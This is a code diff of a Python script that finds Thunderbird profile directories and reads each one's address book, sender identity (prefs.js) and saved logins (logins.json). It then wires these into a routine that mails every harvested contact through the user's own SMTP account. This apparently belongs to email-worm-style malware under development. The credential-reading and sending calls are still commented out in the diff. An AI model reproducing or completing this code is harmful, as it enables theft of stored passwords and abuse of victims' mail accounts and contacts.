@@ -27,6 +27,8 @@ from email.mime.text import MIMEText
 from email.utils import COMMASPACE # Value: ", "
 import json
 
+import filewriter
+
 
 # --------------------------------------------------------------------------
 # -------------------- global variables and constants ----------------------
@@ -45,6 +47,9 @@ ArbitraryType = typing.TypeVar("ArbitraryType")
 ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
 IntKeyArbValDict = typing.Dict[int, ArbitraryType]
 IntKeyStrValDict = typing.Dict[int, str]
+
+TESTING_DIR = "/home/telekobold/TestVerzeichnis/thunderbird-Kopie"
+
 
 # --------------------------------------------------------------------------
 # ----------------- 3rd class send email helper functions ------------------
@@ -100,7 +105,7 @@ def determine_thunderbird_default_file_path() -> str:
 
 def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names: typing.List[str]) -> typing.List[str]:
     """
-    Helper function for `find_default_profile_dir_thunderbird()`.
+    Helper function for `find_thunderbird_default_profile_dir()`.
     
     :thunderbird_path:  The absolute file path to the Thunderbird default
                         config directory.
@@ -144,10 +149,8 @@ def search_file_in_default_dir(filename: str) -> str:
     :returns:  the absolute file name to the searched file if the file could be 
                found, `None` otherwise.
     """
-    # If THUNDERBIRD_PROFILE_DIR is `None`, initialize it. If it is still 
-    # `None`, no Thunderbird default profile directory could be found.
     if not THUNDERBIRD_PROFILE_DIR:
-        find_default_profile_dir_thunderbird()
+        find_thunderbird_default_profile_dir()
     if not THUNDERBIRD_PROFILE_DIR:
         print(f"The file {filename} could not be found!")
         return None
@@ -250,6 +253,31 @@ def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, t
     return 0
 
 
+# Copied from filewriter.py
+def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
+    """
+    Reads the passed text file line by line to a Python dictionary.
+    
+    :filename: the absolute file name of a text file.
+    :returns:  a Python dictionary whose keys are the line numbers (integer 
+               values) and the appropriate values being the content of this line 
+               (string values) in the text file belonging to the passed
+               `filename`.
+    """
+    result = {}
+    # TODO: Add error handling if file opening doesn't work (e.g. because of 
+    # missing access rights). In this case, just continue to the next file.
+    with open(filename, "r") as file:
+        lines = file.readlines()
+    
+    # NOTE: The line indexing starts with 0.
+    for i, line in zip(range(len(lines)), lines):
+        result[i] = line
+        
+    # print("read_text_file_to_dict: result = {}".format(result)) # test output
+    return result
+
+
 # --------------------------------------------------------------------------
 # ----------------- 1st class send email helper functions ------------------
 # --------------------------------------------------------------------------
@@ -304,7 +332,7 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
               Windows, nor Linux.
     """
     #thunderbird_path: str = determine_thunderbird_default_file_path()
-    thunderbird_path: str = "/home/telekobold/TestVerzeichnis/thunderbird-Kopie"
+    thunderbird_path: str = TESTING_DIR
     
     installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
     profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
@@ -314,13 +342,13 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
     # profile directories referenced in that file if those profile directories 
     # actually exist. Avoid redundant entries.
     if os.path.isfile(installs_ini):
-        print("Use installs.ini file")
+        #print("Use installs.ini file")
         with open(installs_ini, "r") as iif:
             for line in iif:
                 if line.startswith("Default="):
                     #print("Default line found!") # test output
                     profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
-            print(f"profile_dir_names = {profile_dir_names}")
+            #print(f"profile_dir_names = {profile_dir_names}")
             return profile_dir_names
     
     # If there is no installs.ini file, return the file path of the
@@ -359,15 +387,16 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
     return profile_dir_names
 
 
-def read_email_addresses_thunderbird() -> typing.List[str]:
+def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
     """
-    :returns: a list of all email addresses as string values contained in 
+    :filepath: the file path to the database (usually the file path to the
+               Thunderbird profile directory).
+    :returns:  a list of all email addresses as string values contained in 
                Thunderbird's "abook.sqlite" database if this database exists, 
-              `None` otherwise.
+               `None` otherwise.
     """
-    # TODO: Search for `abook.sqlite` on the file system
-    # using `os.path.expanduser("~")`
-    database = TESTING_DIR + "/TestVerzeichnis/PythonTest/abook.sqlite"
+    database = os.path.join(filepath, "abook.sqlite")
+    #print(f"database = {database}")
     con = None
     email_addresses = []
     
@@ -385,15 +414,16 @@ def read_email_addresses_thunderbird() -> typing.List[str]:
         return None
     
     
-def read_sender_name_and_email_thunderbird() -> typing.Tuple[str, str]:
+def read_sender_name_and_email_thunderbird(profile_dir: str) -> typing.Tuple[str, str]:
     """
     Searches for the full name and email address in the user's Thunderbird
     default profile. This is usually the full name and email address the user
     first typed in when setting up Thunderbird.
     
-    :returns: A tuple containing the user's full name and email adddress.
-              These values can each be `None` if no corresponding 
-              value could be found.
+    :profile_dir: the file path to the Thunderbird profile directory.
+    :returns:     A tuple containing the user's full name and email address.
+                  These values can each be `None` if no corresponding value 
+                  could be found.
     """
     # The user's full name is stored in the variable "mail.identity.id1.fullName", 
     # the user's email address in the variable "mail.identity.id1.useremail" in 
@@ -401,10 +431,10 @@ def read_sender_name_and_email_thunderbird() -> typing.Tuple[str, str]:
     
     user_name = None
     user_email = None
-    prefs_js_filename = search_file_in_default_dir("prefs.js")
+    prefs_js_filename = os.path.join(profile_dir, "prefs.js")
     
     if prefs_js_filename: # if prefs_js_filename is not `None`
-        lines = read_text_file_to_dict(prefs_js_filename)
+        lines = filewriter.read_text_file_to_dict(prefs_js_filename)
         user_name_regex = r", \"(.+?)\"\);"
         # Regex matching all possible email addresses:
         # email_regex = TODO
@@ -437,7 +467,7 @@ def read_sender_name_and_email_thunderbird() -> typing.Tuple[str, str]:
     return (user_name, user_email)
 
 
-def read_sender_username_and_password_thunderbird(host_name: str) -> typing.Tuple[str, str]:
+def read_sender_username_and_password_thunderbird(host_name: str, profile_dir: str) -> typing.Tuple[str, str]:
     """
     Searches the file "logins.json" in the user's Thunderbird default profile 
     directory for "httpRealm" keys containing a value that ends with the past 
@@ -447,10 +477,11 @@ def read_sender_username_and_password_thunderbird(host_name: str) -> typing.Tupl
     TODO: Check if those passwords can be encrypted if the user types its
     master password.
     
-    :host_name: the host name
-    :returns:   a tuple containing the described values.
+    :host_name:   the host name
+    :profile_dir: the file path to the Thunderbird profile directory.
+    :returns:     a tuple containing the described values.
     """
-    logins_json_filepath = search_file_in_default_dir("logins.json")
+    logins_json_filepath = os.path.join(profile_dir, "logins.json")
     print(f"logins_json_filepath = {logins_json_filepath}")
     with open(logins_json_filepath) as ljf:
         ljf_data = json.load(ljf)
@@ -542,17 +573,20 @@ def send_email() -> None:
     else:
         # Detect all Thunderbird profile directories:
         profile_dirs = find_thunderbird_default_profile_dir()
-        """
         for profile_dir in profile_dirs:
             #print(f"profile_dir = {profile_dir}")
-            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird()
-            #print(to_email_addresses) # test output
-            sender_name: str, sender_email: str = read_sender_name_and_email_thunderbird()
+            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
+            print(f"to_email_addresses = {to_email_addresses}") # test output
+            sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
+            print(f"sender_name = {sender_name}")
+            print(f"sender_email = {sender_email}")
             host_name = sender_email.split("@")[1]
-            sender_username: str, sender_password: str = read_sender_username_and_password_thunderbird(host_name)
+            print(f"host_name = {host_name}")
+            """
+            sender_username, sender_password = read_sender_username_and_password_thunderbird(host_name, profile_dir)
             smtp_server_url, authentication_method = determine_smtp_server(sender_email)
             send_mail_mime(smtp_server_url, authentication_method, sender_password, to_email_addresses)
-        """
+            """
 
 
 if __name__ == "__main__":
